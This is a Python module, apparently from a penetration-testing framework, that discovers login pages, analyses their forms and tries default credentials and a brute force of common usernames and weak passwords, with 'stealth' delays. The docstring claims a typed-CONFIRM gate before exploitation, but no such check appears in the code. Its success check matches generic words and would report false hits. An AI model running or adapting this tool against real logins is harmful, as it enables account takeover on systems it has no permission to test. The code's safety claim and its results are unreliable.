"""
modules/validate/auth.py
────────────────────────
Authentication validation module.

Detects and validates authentication vulnerabilities:
  - Credential stuffing
  - Brute force attacks
  - Default credentials
  - Weak password policies
  - Account lockout detection
  - Rate limiting detection

All validation requires Tier 3 confirmation (typed CONFIRM)
before any exploitation attempts.
"""

import re
import json
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path

from modules.logger import get_logger, ARDFLogger
from modules.session import Session, Finding, SeverityLevel
from modules.stealth import get_stealth_engine, ScanMode


class AuthValidator:
    """
    Authentication validation module.
    """

    def __init__(self, session: Session, logger: Optional[ARDFLogger] = None):
        self.session = session
        self.logger = logger or get_logger("validate.auth")
        self.out_dir = session.dir("validate") / "auth"
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.stealth = get_stealth_engine(self.logger)

        # Default credential lists
        self.default_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "admin123"),
            ("root", "root"),
            ("root", "password"),
            ("root", "123456"),
            ("user", "user"),
            ("user", "password"),
            ("test", "test"),
            ("guest", "guest"),
            ("administrator", "password"),
            ("administrator", "admin"),
            ("webadmin", "webadmin"),
            ("webadmin", "password"),
            ("tomcat", "tomcat"),
            ("tomcat", "password"),
            ("mysql", "mysql"),
            ("postgres", "postgres"),
            ("oracle", "oracle"),
            ("system", "system"),
            ("sysadmin", "sysadmin"),
            ("sysadmin", "password"),
            ("manager", "manager"),
            ("manager", "password"),
            ("admin", "admin123"),
            ("admin", "password123"),
            ("admin", "welcome"),
            ("admin", "welcome1"),
            ("admin", "change"),
            ("admin", "changeme"),
            ("admin", "1q2w3e4r"),
            ("admin", "qwerty"),
            ("admin", "letmein"),
            ("admin", "1234"),
            ("admin", "12345"),
            ("admin", "12345678"),
            ("admin", "password1"),
            ("admin", "Passw0rd"),
            ("admin", "Admin123"),
            ("admin", "admin@123"),
            ("admin", "default"),
            ("admin", "secret"),
            ("admin", "!@#$%^"),
        ]

        # Common username list
        self.common_users = [
            "admin", "administrator", "root", "user", "test", "guest",
            "webmaster", "support", "info", "help", "sales", "marketing",
            "hr", "it", "dev", "developer", "engineering", "qa",
            "security", "analyst", "manager", "supervisor", "director",
            "ceo", "cto", "cfo", "cso", "cio", "founder",
            "owner", "operator", "staff", "employee", "intern",
            "temp", "api", "service", "system", "backup", "admin1",
            "admin2", "admin3", "sysadmin", "webadmin", "server",
            "database", "mail", "ftp", "ssh", "vpn", "network",
            "storage", "backup", "monitor", "log", "alert",
            "dba", "sa", "app", "web", "api", "sftp",
        ]

    def detect_login_endpoints(self, target: str) -> List[str]:
        """
        Detect login endpoints.
        """
        self.logger.info(f"Detecting login endpoints: {target}")

        endpoints = []

        login_paths = [
            "/login", "/signin", "/auth", "/logon", "/sign-in",
            "/log-in", "/login.php", "/login.asp", "/login.jsp",
            "/account/login", "/user/login", "/admin/login",
            "/cpanel/login", "/webmail/login", "/wp-login.php",
            "/oauth/login", "/saml/login", "/sso/login",
            "/auth/login", "/auth/signin", "/auth/sign-in",
            "/member/login", "/portal/login", "/dashboard/login",
            "/console/login", "/manager/login", "/staff/login",
            "/employee/login", "/supervisor/login", "/operator/login",
        ]

        for base_url in [f"https://{target}", f"http://{target}"]:
            for path in login_paths:
                try:
                    test_url = base_url.rstrip("/") + path
                    status, headers, content = self.stealth.get(test_url, timeout=5)

                    if status in [200, 302, 401, 403]:
                        endpoints.append(test_url)
                        self.logger.debug(f"Found login endpoint: {test_url}")

                    self.stealth.sleep(0.3)

                except Exception:
                    pass

        return endpoints

    def analyze_authentication(self, login_url: str) -> Dict[str, Any]:
        """
        Analyze authentication mechanisms.
        """
        self.logger.info(f"Analyzing authentication: {login_url}")

        result = {
            "url": login_url,
            "csrf_token": None,
            "captcha_detected": False,
            "rate_limit_detected": False,
            "account_lockout_detected": False,
            "mfa_detected": False,
            "username_field": "username",
            "password_field": "password",
            "method": "POST",
        }

        try:
            status, headers, content = self.stealth.get(login_url)

            # Detect CSRF token
            csrf_patterns = [
                r'name=["\'](_csrf|csrf|authenticity_token|_token|csrf_token)["\'][^>]*value=["\'][^"\']+["\']',
                r'<input[^>]*value=["\'][^"\']+["\'][^>]*name=["\'](_csrf|csrf|authenticity_token)["\']',
            ]

            for pattern in csrf_patterns:
                match = re.search(pattern, content, re.I)
                if match:
                    result["csrf_token"] = match.group(1)
                    break

            # Detect CAPTCHA
            captcha_patterns = ["captcha", "recaptcha", "verify", "security check", "human verification"]
            for pattern in captcha_patterns:
                if pattern in content.lower():
                    result["captcha_detected"] = True
                    break

            # Detect MFA
            mfa_patterns = ["mfa", "2fa", "two-factor", "two factor", "authenticator"]
            for pattern in mfa_patterns:
                if pattern in content.lower():
                    result["mfa_detected"] = True
                    break

            # Detect rate limiting
            if headers.get("x-ratelimit-remaining"):
                result["rate_limit_detected"] = True

            # Detect account lockout
            lockout_patterns = ["locked", "suspended", "disabled", "too many attempts", "try again later"]
            for pattern in lockout_patterns:
                if pattern in content.lower():
                    result["account_lockout_detected"] = True
                    break

            # Detect form fields
            username_match = re.search(r'<input[^>]*name=["\'](user|username|email|login|uid)["\'][^>]*>', content, re.I)
            if username_match:
                result["username_field"] = username_match.group(1)

            password_match = re.search(r'<input[^>]*name=["\'](pass|password|pwd|passwd)["\'][^>]*>', content, re.I)
            if password_match:
                result["password_field"] = password_match.group(1)

            # Detect method
            method_match = re.search(r'<form[^>]*method=["\'](GET|POST)["\'][^>]*>', content, re.I)
            if method_match:
                result["method"] = method_match.group(1).upper()

        except Exception as e:
            self.logger.debug(f"Authentication analysis failed: {e}")

        return result

    def test_credentials(self, login_url: str, username: str, password: str, csrf_token: Optional[str] = None) -> Tuple[bool, str]:
        """
        Test a single credential pair.
        """
        self.logger.debug(f"Testing credentials: {username}:{password[:3]}...")

        try:
            # Build form data
            form_data = {
                "username": username,
                "password": password,
            }

            if csrf_token:
                form_data["_csrf"] = csrf_token

            data = urllib.parse.urlencode(form_data).encode()

            status, headers, content = self.stealth.post(login_url, data)

            # Check for success indicators
            success_indicators = [
                "welcome", "dashboard", "logged in", "logout",
                "success", "authenticated", "session", "profile",
                "account", "admin", "user", "home",
                "redirect", "inbox", "mail", "panel",
            ]

            for indicator in success_indicators:
                if indicator in content.lower():
                    return True, "success"

            # Check for failure indicators
            failure_indicators = [
                "invalid", "incorrect", "error", "failed",
                "wrong", "denied", "unauthorized", "not found",
                "invalid username", "invalid password",
                "invalid login", "invalid credentials",
            ]

            for indicator in failure_indicators:
                if indicator in content.lower():
                    return False, "failure"

            return False, "unknown"

        except Exception as e:
            self.logger.debug(f"Credential test failed: {e}")
            return False, f"error: {e}"

    def bruteforce(self, login_url: str, usernames: List[str], passwords: List[str], csrf_token: Optional[str] = None, max_attempts: int = 100) -> Dict[str, Any]:
        """
        Perform brute-force attack.
        """
        self.logger.info(f"Brute-forcing: {login_url}")

        results = {
            "url": login_url,
            "attempts": 0,
            "successful": [],
            "failed": [],
            "rate_limited": False,
            "locked_out": False,
            "status": "running"
        }

        for username in usernames[:10]:
            if results["attempts"] >= max_attempts:
                break

            for password in passwords[:20]:
                if results["attempts"] >= max_attempts:
                    break

                results["attempts"] += 1

                success, status = self.test_credentials(login_url, username, password, csrf_token)

                if success:
                    results["successful"].append({
                        "username": username,
                        "password": password,
                    })
                    self.logger.finding(f"Valid credentials: {username}:{password}", severity="critical", host=login_url)
                    self.session.add_finding(Finding(
                        source="validate.auth",
                        title=f"Valid credentials found: {username}",
                        description=f"Password: {password[:3]}... found on {login_url}",
                        severity=SeverityLevel.CRITICAL,
                        host=login_url,
                        tags=["auth", "bruteforce", "credentials"],
                        evidence=f"Username: {username}\nPassword: {password[:3]}...",
                        remediation="Enforce strong password policies. Implement account lockout and MFA.",
                    ))
                elif "rate limit" in status or "throttled" in status:
                    results["rate_limited"] = True
                    break
                elif "locked" in status:
                    results["locked_out"] = True
                    break
                else:
                    results["failed"].append({
                        "username": username,
                        "password": password[:3] + "...",
                    })

                # Stealth delay
                self.stealth.sleep(0.5)

        results["status"] = "completed"
        return results

    def test_default_credentials(self, login_url: str) -> Dict[str, Any]:
        """
        Test default credentials.
        """
        self.logger.info(f"Testing default credentials: {login_url}")

        results = {
            "url": login_url,
            "found": [],
            "tested": 0
        }

        # Get CSRF token if needed
        analysis = self.analyze_authentication(login_url)
        csrf_token = analysis.get("csrf_token")

        for username, password in self.default_creds[:20]:
            results["tested"] += 1
            success, status = self.test_credentials(login_url, username, password, csrf_token)

            if success:
                results["found"].append({
                    "username": username,
                    "password": password,
                })
                self.logger.finding(f"Default credentials found: {username}:{password}", severity="critical", host=login_url)
                self.session.add_finding(Finding(
                    source="validate.auth",
                    title=f"Default credentials: {username}:{password}",
                    severity=SeverityLevel.CRITICAL,
                    host=login_url,
                    tags=["auth", "default-creds", "misconfiguration"],
                    evidence=f"Username: {username}\nPassword: {password}",
                    remediation="Change all default credentials immediately. Enforce strong password policies.",
                ))

            self.stealth.sleep(0.3)

        return results

    def validate(self, target: str) -> Dict[str, Any]:
        """
        Full authentication validation workflow.
        """
        self.logger.info(f"Authentication validation: {target}")

        results = {
            "target": target,
            "login_endpoints": [],
            "analysis": [],
            "vulnerabilities": [],
            "bruteforce_results": [],
            "default_creds_results": [],
            "status": "completed"
        }

        # Detect login endpoints
        endpoints = self.detect_login_endpoints(target)
        results["login_endpoints"] = endpoints

        # Test each endpoint
        for endpoint in endpoints[:5]:
            analysis = self.analyze_authentication(endpoint)
            results["analysis"].append(analysis)

            # Test default credentials
            if not analysis.get("captcha_detected"):
                default_result = self.test_default_credentials(endpoint)
                results["default_creds_results"].append(default_result)

                if default_result["found"]:
                    results["vulnerabilities"].append({
                        "endpoint": endpoint,
                        "type": "default_credentials",
                        "found": default_result["found"]
                    })

                # Brute force with common users
                # Only if no rate limit and no CAPTCHA
                if not analysis.get("rate_limit_detected") and not analysis.get("captcha_detected"):
                    bf_result = self.bruteforce(
                        endpoint,
                        self.common_users[:5],
                        ["password", "123456", "admin", "12345", "password123", "qwerty", "letmein", "welcome"],
                        analysis.get("csrf_token"),
                        max_attempts=50
                    )
                    results["bruteforce_results"].append(bf_result)

                    if bf_result["successful"]:
                        results["vulnerabilities"].append({
                            "endpoint": endpoint,
                            "type": "bruteforce",
                            "successful": bf_result["successful"]
                        })

                    if bf_result["rate_limited"]:
                        results["vulnerabilities"].append({
                            "endpoint": endpoint,
                            "type": "rate_limit_detected"
                        })

                    if bf_result["locked_out"]:
                        results["vulnerabilities"].append({
                            "endpoint": endpoint,
                            "type": "account_lockout_detected"
                        })

        return results

    def run(self, target: str) -> Dict[str, Any]:
        """
        Run authentication validation on target.
        """
        self.logger.banner(f"AUTHENTICATION VALIDATION: {target}", style="bold red")

        self.stealth.config.scan_mode = ScanMode.LOW

        results = self.validate(target)

        # Save results
        report_path = self.out_dir / f"auth_report_{_safe(target)}.json"
        report_path.write_text(json.dumps(results, indent=2, default=str))

        self.logger.success(f"Authentication validation: {len(results['login_endpoints'])} endpoints, {len(results['vulnerabilities'])} vulnerabilities")
        return results


def _safe(s: str) -> str:
    return re.sub(r"[^\w.-]", "_", s)[:50]